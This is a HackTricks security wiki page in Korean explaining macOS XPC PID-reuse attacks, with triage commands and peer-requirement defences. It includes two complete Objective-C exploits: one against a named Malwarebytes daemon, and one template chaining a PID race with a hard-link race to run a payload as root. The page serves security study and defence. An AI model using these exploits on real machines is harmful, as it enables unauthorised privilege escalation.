# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

macOS **XPC service**가 수신한 메시지에 연결된 credentials를 사용하지 않고 **PID**를 확인하여 caller를 인증하면 PID reuse attack에 취약할 수 있습니다. 실제로 필요한 primitive은 PID namespace가 wrap될 때까지 기다리는 것이 아닙니다. 공격자는 XPC request를 전송한 직후 **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`**을 **`POSIX_SPAWN_SETEXEC`**와 함께 호출하여, **PID를 유지한 채 허용된 binary로 공격자 process image를 교체**합니다.<sup>[[1]](#references)[[2]](#references)</sup>

서버가 request를 dequeue한 다음에야 해당 numeric PID를 확인하여 code-signing, entitlement, path 또는 parent-process check를 수행한다면, 메시지를 전송한 process가 아니라 replacement binary를 확인하게 됩니다. `POSIX_SPAWN_START_SUSPENDED`는 서버가 check를 수행하는 동안 신뢰된 replacement가 실행 상태로 유지되고 안정적으로 존재하도록 합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 실제로 race가 발생하는 부분

취약한 sequence는 단순히 “PIDs can repeat”가 아니라 **message-identity TOCTOU**입니다:<sup>[[1]](#references)[[2]](#references)</sup>

1. 공격자 process가 XPC connection을 설정하거나 재개하고 privileged request를 queue에 추가합니다.
2. service가 connection의 PID를 `SecCodeRef` 또는 다른 process object로 변환하기 전에, 공격자는 `POSIX_SPAWN_SETEXEC`을 사용하여 동일한 process를 승인된 executable로 overlay합니다.
3. service는 현재 해당 PID에 연결된 승인된 image를 검증한 다음, 이미 queue에 추가된 attacker-controlled request를 dispatch합니다.

authorization data flow에 존재하는 모든 PID bridge는 의심해야 합니다. 예를 들어 `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid`, 또는 `audit_token_to_pid` 이후에 `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` 또는 custom signature verifier가 이어지는 경우입니다. PID가 logging에만 사용된다면 충분하지 않습니다. 해당 PID가 allow/deny decision에 도달하는지 확인해야 합니다. 또한 error path도 검사해야 합니다. 먼저 audit-token lookup을 시도하지만 **실패 시 PID로 fallback**하면 동일한 race가 다시 발생합니다. 이 fallback pattern은 Intego의 privileged XPC services에 대한 2026년 analysis에서 확인되었습니다.<sup>[[3]](#references)</sup>

### 빠른 static 및 dynamic triage

connection handler에서 시작하여 각 PID-producing call이 code-signing, entitlement, executable-path 또는 version check로 이어지는 과정을 추적합니다. 다음 command들은 candidate helper를 빠르게 first pass할 수 있도록 합니다. stripped binary에서도 imported symbols, Objective-C selectors 또는 diagnostic strings가 여전히 일반적으로 노출됩니다:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
통제된 테스트 중에 PID source와 해당 verifier를 모두 break하거나 hook하세요. `xpc_connection_get_pid` 또는 `-processIdentifier`에 대한 hit는 단서일 뿐입니다. 유용한 증거는 request가 수신된 후 **동일한 integer**를 나중에 lookup하는 것입니다. Frida를 사용하면 application-specific verifier와 privileged selector도 추가로 hook하여 PID race가 성공했을 때 selector가 실행되는지 측정할 수 있습니다.<sup>[[3]](#references)</sup>

### Exploit example

**`shouldAcceptNewConnection`** 함수 또는 이 함수가 호출하는 함수에서 **`processIdentifier`**를 **호출**하지만 **`auditToken`**은 호출하지 않는 것을 발견했다면, 이는 **audit token이 아니라 process PID를 verifying하고 있음**을 의미할 가능성이 높습니다.\
예를 들어 다음 이미지와 같습니다(reference에서 가져옴):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

이 예제 exploit을 확인하여 exploit의 2가지 부분을 살펴보세요(다시 말해 reference에서 가져옴):<sup>[[1]](#references)</sup>

- 여러 fork를 **생성**하는 부분
- **각 fork**가 **payload**를 XPC service로 **전송**한 직후 **`posix_spawn`**을 실행하는 부분

> [!CAUTION]
> Objective-C process에서 `fork()`와 race할 때는 `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`를 export한 상태로 exploit을 실행하거나 `__objc_fork_ok` marker를 포함하세요:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
**NSTasks**와 child를 launch하는 argument를 사용하는 첫 번째 옵션으로 RC exploit-s...
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
이 예제에서는 raw **`fork`**를 사용해 **PID race condition을 악용할 children**을 실행한 다음, Hard link를 통한 **또 다른 race condition을 악용**합니다:
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## race 재현하기

다음 튜닝 포인트는 정상적으로 작동하는 PID-reuse exploit 및 최근 privileged-helper 테스트에서 반복적으로 나타납니다:<sup>[[1]](#references)[[3]](#references)</sup>

- 요청을 전송한 뒤 즉시 `posix_spawn`을 호출하고, 응답을 기다리지 **마세요**. image replacement 이후 server의 PID lookup이 수행되는 동안 요청이 이미 queue에 있어야 합니다.
- `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`를 함께 사용하세요. 첫 번째 flag는 racing process의 PID를 유지하고, 두 번째 flag는 validation 전에 유효한 target이 종료되거나 상태를 변경하지 못하도록 합니다.
- 수명이 짧은 racer를 여러 개 사용하고 전체 connection/request/exec sequence를 retry하세요. 최적 개수는 target에 따라 다르며, child가 지나치게 많으면 service가 느려지고 window가 더 나빠질 수 있습니다.
- replacement는 server의 **전체** requirement를 충족해야 합니다. 가능한 경우 legitimate client binary를 재사용하고, 먼저 `codesign -d -r- "/path/to/client.app"`로 해당 binary의 designated requirement를 확인하세요.
- 먼저 무해한 exported selector 또는 read-only method를 호출하세요. 이렇게 하면 authentication을 성공적으로 통과한 것과 이후 privileged primitive을 성공적으로 exploit한 것을 구분할 수 있습니다.

## PID bridge 피하기

macOS 13+에서는 Foundation이 `-[NSXPCConnection setCodeSigningRequirement:]`를 제공합니다. peer requirement를 정확히 한 번만, 그리고 `resume` **전에** 설정하세요. 형식이 잘못된 requirement string은 exception(또는 Swift fatal error)을 발생시키며, requirement를 충족하지 않는 peer의 message는 connection을 무효화합니다. 이를 통해 application code가 PID를 resolve하지 않아도 XPC가 peer의 code identity를 적용할 수 있습니다.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
macOS 26+의 최신 low-level listener API에서 `xpc_listener_set_peer_requirement`는 listener가 비활성 상태일 때 검증된 `xpc_peer_requirement_t`를 적용합니다. XPC는 이를 충족하지 않는 요청을 삭제합니다. listener에서 생성된 peer 세션은 이를 **상속하지 않으므로**, 해당 세션이 privileged operation을 허가할 때는 적절한 session requirement도 함께 적용해야 합니다.<sup>[[7]](#references)</sup>

> [!WARNING]
> 실제 `SecCode` 조회를 위해 audit token을 복사한 다음 PID로 다시 변환하는 방식으로 이를 “수정”하지 마세요. authorization decision 과정에서 audit token에서 파생된 identity를 유지하거나, XPC peer-requirement API를 처음부터 끝까지 사용하세요.<sup>[[2]](#references)[[6]](#references)</sup> connection 전체에 적용되는 audit-token API에도 별도의 race class가 있으며, 이는 [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md)에서 다룹니다.

## 기타 예시

- [**Intego X9: macOS antivirus가 PIDs를 신뢰해서는 안 되는 이유**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - 클라이언트를 PID로 인증한 AV의 privileged helper를 대상으로 한 LPE.<sup>[[3]](#references)</sup>
- [**macOS에서 GOG Galaxy XPC service를 Exploiting하여 privilege escalation 수행**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [PID를 거부하라! XPC exploitation 배우기 - Part 2](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [PID를 신뢰하지 마세요! 단순한 logic bug와 이를 찾을 수 있는 위치에 대한 이야기 - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: macOS antivirus가 PIDs를 신뢰해서는 안 되는 이유](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [macOS에서 GOG Galaxy XPC service를 Exploiting하여 privilege escalation 수행](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
